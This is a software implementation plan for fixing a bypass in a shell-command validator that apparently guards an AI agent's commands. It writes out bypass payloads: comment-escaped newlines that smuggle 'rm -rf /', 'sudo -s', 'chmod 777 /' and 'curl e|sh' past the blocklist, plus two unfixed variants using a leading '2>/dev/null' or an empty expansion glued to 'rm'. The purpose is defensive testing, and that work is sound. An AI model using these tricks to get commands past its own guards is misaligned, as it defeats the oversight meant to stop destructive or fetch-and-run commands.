# Implementation Plan: the comment/newline fail-open that `commenters = ""` did not close

> Follow-up to `plan-validator-segmentation.md`, opened by finding **C1** of the adversarial
> code review of that change (2026-08-21). Same module, same defect class, one commit.

## The defect

`plan-validator-segmentation` closed the case where an apostrophe in a trailing comment made
`_split_unquoted_newlines()` and shlex disagree about quote state. Its stated property — "the
two parsers can no longer disagree about where quotes are" — is **false**, and the review
proved it by execution rather than argument:

```
echo #\
rm -rf /                              i.e.  "echo #\\\nrm -rf /"

  NEW safe   -> (True, 'OK')          <-- the SHIPPED mode
  NEW unsafe -> (True, 'OK')
  lines      -> ['echo #\\\nrm -rf /']            (no split)
  segments   -> [['echo', '#\nrm', '-rf', '/']]   (`rm` glued into a token,
                                                   never in command position)
```

Ground truth, executed: `bash --noprofile --norc -c $'echo #\\\nrm -rf victim.txt'` **deletes
the file**. Bash gives a backslash no special meaning inside a `#` comment — the newline ends
the comment and the next word starts a fresh command. `_split_unquoted_newlines` applies
line-continuation semantics unconditionally, so it swallows the newline; shlex, with comment
stripping now disabled, absorbs `#\n` into the following word. Confirmed the same shape with
`ls # note\<nl>sudo -s`, `echo #x\<nl>chmod 777 /`, `make test #\<nl>curl e|sh`.

This is `validator-executor-divergence`: the validator and bash disagree about what the input
is, and the disagreement fails **open** on a blocklisted command.

## Fix — suppress the escape inside a comment, and nothing else

One flag in `_split_unquoted_newlines`: `in_comment`, set by an unquoted `#`, cleared when a
newline actually splits. While it is set, a backslash no longer escapes the next character.

**Deliberately NOT done: treating the comment as unquoted text.** That is the larger, more
"correct" fix (bash does not see quotes inside a comment either), and it is rejected here
because it converts the segmentation plan's asserted fail-closed cases into a different
mechanism and flips its disclosed cost. Under this minimal fix every verdict in
`tests/test_validator_segmentation.py` is unchanged — measured, listed below — and the only
input whose verdict moves is the bypass itself.

| input | before this fix | after | mechanism |
|---|---|---|---|
| `echo #\<nl>rm -rf /` | **ALLOW** (both modes) | **REJECT** | escape suppressed -> the newline splits -> line 2 base `rm` is blocklisted |
| `ls # note\<nl>sudo -s` | **ALLOW** | **REJECT** | same |
| `make test # don't rebuild\<nl>rm -rf /` | REJECT | REJECT, same reason | quote toggling still applies in a comment, so the newline still reads as quoted and shlex still reports the malformed quote |
| `echo hi # don't\<nl>echo two` | REJECT (Malformed) | REJECT, same reason | the disclosed false-positive cost is unchanged |
| `ls \<nl> -la` | REJECT (`-la` not allowlisted) | unchanged | no `#`, so `in_comment` is never set |
| `echo hi # rebuild\<nl>echo two` | ALLOW | ALLOW | no unbalanced quote, no backslash |

Keeping quote-toggling active inside a comment is conservative in the fail-closed direction: an
unbalanced quote behind a `#` still reaches shlex and is still refused.

## Out of scope, and why — the two findings NOT fixed here

The same review reported two further `validator-executor-divergence` instances. Both are
**pre-existing** (measured identical at `HEAD` before the segmentation change), both are
`safe_mode=False` only, and neither is touched by this fix:

- **M1** `2>/dev/null rm -rf /` -> a leading file-descriptor digit becomes the base command
  (`Command not in allowlist: 2` in the default mode; **ALLOW** with the allowlist off).
- **M2** ` ``rm -rf /`, `rm$() -rf /` -> an empty expansion glued to the command name defeats
  base matching (**ALLOW** with the allowlist off).

Both falsify the `BLOCKLIST` docstring's claim ("NEVER allowed, even in unsafe mode"), which is
a real defect, but fixing tokenizer-level base-name normalisation is a separate behaviour
surface deserving its own matrix — the same reasoning that kept wrapper-argument inspection out
of the segmentation plan. Backlogged, named, not smuggled in.

## Implementation Steps

1. `src/claudekit/security/command_validator.py` — the `in_comment` flag plus a docstring
   paragraph naming the payload, so the next maintainer cannot "simplify" the flag away.
2. `tests/test_validator_segmentation.py` — `COMMENT_ESCAPED_NEWLINE` (4 payloads) added to
   `MUST_REJECT`, and `test_a_backslash_in_a_comment_does_not_swallow_the_newline` asserting
   in **both** modes. Without these the suite passes against the unfixed splitter: the
   existing matrix has no case with a backslash before the newline, which is exactly why the
   defect shipped through three plan-review rounds.
3. `CHANGELOG.md` — correct the claim already written in `[Unreleased]`, rather than adding a
   second entry that contradicts it.

## Testing Strategy

The discriminator is the mutant: **revert the `in_comment` flag** and the four
`COMMENT_ESCAPED_NEWLINE` cases plus the both-mode test must fail, and nothing else in the
module may move. The rest of `tests/test_validator_segmentation.py` is the guard — it asserts
this fix does not disturb the segmentation change's own verdicts.

Also required: full `pytest tests/ -q`, `ruff`, `mypy`, and the security-module coverage floor.

## Rollback

`git revert` — one module, one test file, one CHANGELOG paragraph. Reverting reopens the
bypass, which is why the test names the payload.
